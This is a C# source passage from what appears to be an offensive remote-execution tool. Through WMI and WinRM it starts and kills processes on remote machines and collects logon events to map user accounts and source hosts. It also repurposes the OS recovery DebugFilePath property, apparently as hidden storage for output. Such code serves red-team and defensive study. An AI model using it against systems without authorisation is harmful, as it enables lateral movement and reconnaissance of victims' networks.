            // Grab all procs so we can build the dictionary
            const string query = "SELECT * FROM Win32_Process";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);
            IEnumerable<CimInstance> cimInstances = queryInstance as CimInstance[] ?? queryInstance.ToArray();

            // Probs not efficient but let's create a dict of all the handles/process names
            foreach (CimInstance cimObject in cimInstances)
            {
                procDict.Add(cimObject.CimInstanceProperties["Handle"].Value.ToString(), cimObject.CimInstanceProperties["Name"].Value.ToString());
            }

            // If a process handle was given just kill it
            if (uint.TryParse(processToKill, out uint result))
                KillProc(processToKill, procDict[processToKill], cimSession, cimInstances);

            // If we got a process name
            else
            {
                //Parse for * sent in process name
                string subQuery = null;
                if (processToKill.Contains("*"))
                {
                    processToKill = processToKill.Replace("*", "%");
                    subQuery = $"SELECT * FROM Win32_Process WHERE Name like '{processToKill}'";
                }
                else
                {
                    subQuery = $"SELECT * FROM Win32_Process WHERE Name='{processToKill}'";
                }

                IEnumerable<CimInstance> subQueryInstances = cimSession.QueryInstances(Namespace, "WQL", subQuery);

                foreach (CimInstance cimObject in subQueryInstances)
                {
                    KillProc(cimObject.CimInstanceProperties["Handle"].Value.ToString(), procDict[cimObject.CimInstanceProperties["Handle"].Value.ToString()], cimSession, cimInstances);
                }
            }
            return true;
        }

        public object process_start(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string binPath = planter.Commander.Process;

            if (!CheckForFile(binPath, cimSession, verbose: false))
            {
                Messenger.ErrorMessage(
                    "[-] Specified file does not exist on the remote system, not creating process\n");
                return null;
            }

            // Create the parameters and create the new process.
            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
            {
                CimMethodParameter.Create("CommandLine", binPath, CimFlags.In)
            };

            // Execute the method and obtain the return values.
            CimMethodResult results =
                cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);

            switch (Convert.ToUInt32(results.ReturnValue.Value))
            {
                case 0:
                    Console.WriteLine("Process {0} has been successfully created",
                        results.OutParameters["ProcessID"].Value);
                    return true;
                case 2:
                    throw new SecurityException("Access denied");
                case 3:
                    throw new SecurityException("Insufficient privilege");
                case 21:
                    throw new Exception("Invalid parameter");
                default:
                    throw new Exception("Unknown failure");
            }

        }

        public object logon_events(Planter planter)
        {
            // Hacky solution but works for now
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            string[] logonType = {"Logon Type:		2", "Logon Type:		10"};
            const string logonProcess = "Logon Process:		User32";
            Regex searchTerm = new Regex(@"(Account Name.+|Workstation Name.+|Source Network Address.+)");
            Regex r = new Regex("New Logon(.*?)Authentication Package", RegexOptions.Singleline);
            List<string[]> outputList = new List<string[]>();
            DateTime latestDate = DateTime.MinValue;

            const string query = "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')";
            IEnumerable<CimInstance> queryInstances = cimSession.QueryInstances(Namespace, "WQL", query);


            Messenger.WarningMessage(
                "[*] Depending on the amount of events, this may take some time to parse through.\n");

            Console.WriteLine("{0,-30}{1,-30}{2,-40}{3,-20}", "User Account", "System Connecting To",
                "System Connecting From", "Last Login");
            Console.WriteLine("{0,-30}{1,-30}{2,-40}{3,-20}", "------------", "--------------------",
                "----------------------", "----------");

            foreach (CimInstance cimObject in queryInstances)
            {
                string message =
                    cimObject.CimInstanceProperties["Message"].Value
                        .ToString(); // Let's avoid doing this multiple times

                if (logonType.Any(message.Contains) && message.Contains(logonProcess))
                {
                    Match singleMatch = r.Match(cimObject.CimInstanceProperties["Message"].Value.ToString());
                    string[] breaks = singleMatch.Value.Split(new[] {Environment.NewLine}, StringSplitOptions.None);
                    var queryMatchingFiles =
                        from line in breaks
                        let matches = searchTerm.Matches(line)
                        where matches.Count > 0
                        where !line.EndsWith("$")
                        select line;

                    List<string> tempList = new List<string>();
                    foreach (string v in queryMatchingFiles)
                    {
                        string[] importantInfo = v.Split(new[] {":"}, StringSplitOptions.RemoveEmptyEntries);
                        if (importantInfo[1].Trim() != "-")
                        {
                            if (!string.IsNullOrEmpty(importantInfo[1].Trim()))
                            {
                                tempList.Add(importantInfo[1].Trim());
                            }
                        }
                    }

                    DateTime tempDate = (DateTime) cimObject.CimInstanceProperties["TimeGenerated"].Value;
                    tempList.Add(tempDate.ToString(CultureInfo.InvariantCulture));

                    string[] tempArray = tempList.ToArray();

                    // We need to check if this is the first loop and handle accordingly
                    if (outputList.Count > 0)
                    {
                        // If any of the arrays in the outputList do not match the temp array (excluding datetime value)
                        if (!outputList.Any(p => p.Take(3).SequenceEqual(tempArray.Take(3))))
                        {

                            outputList.Add(tempArray);
                            latestDate = tempDate;
                        }
                    }
                    else
                        outputList.Add(tempArray);

                }
            }

            foreach (string[] entry in outputList)
            {
                Console.WriteLine("{0,-30}{1,-30}{2,-40}{3,-20}", entry[0], entry[1], entry[2], entry[3]);
            }

            return queryInstances;
        }


        public object KillProc(string handle, string procName, CimSession cimSession, IEnumerable<CimInstance> cimInstances)
        {
            CimMethodResult results = null;
            try
            {
                foreach (CimInstance cimObject in cimInstances)
                {
                    if (cimObject.CimInstanceProperties["Handle"].Value.ToString() == handle)
                    {
                        results = cimSession.InvokeMethod(cimObject, "Terminate", null);
                    }
                }

                if (results != null && Convert.ToUInt32(results.ReturnValue.Value) == 0)
                {
                    Console.WriteLine("Successfully killed '{0}'", procName);
                    return true;
                }

                Messenger.ErrorMessage("[-] Error: Not able to kill process: " + procName);
                return false;
            }
            catch (Exception e)
            {
                Messenger.ErrorMessage("[-] Error killing process: " + procName);
                Console.WriteLine(e);
                return false;
            }
        }

        public Runspace RunspaceCreate(Planter planter)
        {
            try
            {
                if (planter.Password == null)
                {
                    Uri remoteComputerUri = new Uri("http://" + planter.System + ":5985/WSMAN");
                    WSManConnectionInfo connectionInfo = new WSManConnectionInfo(remoteComputerUri);
                    Runspace remoteRunspace = RunspaceFactory.CreateRunspace(connectionInfo);
                    remoteRunspace.Open();
                    return remoteRunspace;
                }

                string domainCredz = planter.Domain + "\\" + planter.User;
                Uri remoteComputer = new Uri($"http://{planter.System}:5985/wsman");
                PSCredential creds = new PSCredential(domainCredz, planter.Password);
                WSManConnectionInfo connection = new WSManConnectionInfo(remoteComputer, null, creds);
                    
                Runspace runspace = RunspaceFactory.CreateRunspace(connection);
                runspace.Open();
                return runspace;

            }
            catch (PSRemotingTransportException)
            {
                Messenger.WarningMessage("[*] Issue creating PS runspace, the machine might not be accepting WSMan connections for a number of reasons, trying process create method...\n");
                throw new PSRemotingTransportException();
            }
            catch (Exception e)
            {
                Messenger.ErrorMessage("[-] Error creating PS runspace");
                Console.WriteLine(e);
                return null;
            }
        }

        public Runspace RunspaceCreateLocal()
        {
            try
            {
                WSManConnectionInfo connectionInfo = new WSManConnectionInfo();
                Runspace localRunspace = RunspaceFactory.CreateRunspace(connectionInfo);
                localRunspace.Open();
                return localRunspace;
            }

            catch (PSRemotingTransportException)
            {
                Messenger.WarningMessage("Error creating PS runspace, the machine might not be accepting WSMan connections for a number of reasons, trying process create method...\n");
                throw new PSRemotingTransportException();
            }

            catch (Exception e)
            {
                Messenger.ErrorMessage("[-] Error creating PS runspace");
                Console.WriteLine(e);
                return null;
            }
        }

        public string GetOsRecovery(CimSession cimSession)
        {
            // Grab the original WMI Property so we can set it back afterwards
            try
            {
                const string query = "SELECT * FROM Win32_OSRecoveryConfiguration";
                IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);
                IEnumerable<CimInstance> cimInstances = queryInstance as CimInstance[] ?? queryInstance.ToArray();

                var originalWmiProperty = cimInstances.First().CimInstanceProperties["DebugFilePath"].Value.ToString();
                //System.Environment.Exit(1);

                return originalWmiProperty;
            }

            catch (CimException exception) when (exception.MessageId == "HRESULT 0x80338043")
            {
                Console.WriteLine("Issue with DebugFilePath property, please use the reset option with WMI");
                throw new RektDebugFilePath(exception.Message);
            }

            catch (CimException exception)
            {
                Messenger.ErrorMessage("Issue getting the DebugFilePath, if previous executions did not finish successfully you may need to reset it back to the default (using -r)");
                Console.WriteLine("Error Code = " + exception.NativeErrorCode);
                Console.WriteLine("MessageId = " + exception.MessageId);
                Console.WriteLine("ErrorSource = " + exception.ErrorSource);
                Console.WriteLine("ErrorType = " + exception.ErrorType);
                Console.WriteLine("Status Code = " + exception.StatusCode);
                System.Environment.Exit(1);
            }

            catch (Exception e)
            {
                Messenger.ErrorMessage("[-] Error grabbing DebugFilePath");
                Console.WriteLine(e);
                System.Environment.Exit(1);
            }
            return null;
        }

        public static void SetOsRecovery(CimSession cimSession, string originalWmiProperty)
        {
            // Set the original WMI Property
            try
            {
                const string query = "SELECT * FROM Win32_OSRecoveryConfiguration";
                IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);

                foreach (CimInstance cimObject in queryInstance)
                {
                    cimObject.CimInstanceProperties["DebugFilePath"].Value = originalWmiProperty;
                    cimSession.ModifyInstance(cimObject);
                }
            }

            catch (Exception e)
            {
                throw new RektDebugFilePath(e.Message);
            }
        }

        public bool CheckForFile(string path, CimSession cimSession, bool verbose)
        {
            string newPath = path.Replace("\\", "\\\\");

            string query = $"SELECT * FROM CIM_DataFile Where Name='{newPath}' ";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);
            IEnumerable<CimInstance> cimInstances = queryInstance as CimInstance[] ?? queryInstance.ToArray();
            
            if (!cimInstances.Any())
            {
                if(verbose)
                    Messenger.ErrorMessage("[-] Specified file does not exist, not running PS runspace");
                return false;
            }

            if (Convert.ToInt32(cimInstances.First().CimInstanceProperties["FileSize"].Value) == 0)
            {
                Messenger.ErrorMessage("[-] Error: The file is present but zero bytes, no contents to display");
                return false;
            }
            return true;
        }

        public int GetFileSize(string path, CimSession cimSession)
        {
            // I created a new method so I could keep the one above it as a bool. I agree, not very efficient at all
            string newPath = path.Replace("\\", "\\\\");

            string query = $"SELECT * FROM CIM_DataFile Where Name='{newPath}' ";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);
            
            return Convert.ToInt32(queryInstance.First().CimInstanceProperties["FileSize"].Value);
        }

        public string CheckForFinishedDebugFilePath(string originalWmiProperty, CimSession cimSession)
        {
            bool warn = false;
            string returnRecovery = null;
            bool breakLoop = false;
            int counter = 0;

            do
            {
                string modifiedRecovery = GetOsRecovery(cimSession);
                if (modifiedRecovery == originalWmiProperty)
                {
                    Messenger.WarningMessage("DebugFilePath write not completed, sleeping for 10s...");
                    Thread.Sleep(10000);
                    warn = true;
                    counter++;
                    if (counter > 12)
                    {
                        // We only want to run for 2 mins max
                        breakLoop = true;
                    }
                }
                else
                {
                    if (warn == true) //I only want this if the warning gets thrown so it stays pretty
                    {
                        Console.WriteLine("\n\n");
                    }
                    returnRecovery = modifiedRecovery;
                    return returnRecovery;
                }
            } while (breakLoop == false);

            return returnRecovery;
        }

        public bool IsNullOrEmpty(Array array)
        {
            return (array == null || array.Length == 0);
        }

        public string Truncate(string value, int maxLength)
        {
            if (string.IsNullOrEmpty(value)) return value;
            return value.Length <= maxLength ? value : value.Substring(0, maxLength);
        }

        // Borrowed from https://stackoverflow.com/a/1344242
        private static readonly Random Random = new Random();

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[Random.Next(s.Length)]).ToArray());
        }
    }
}
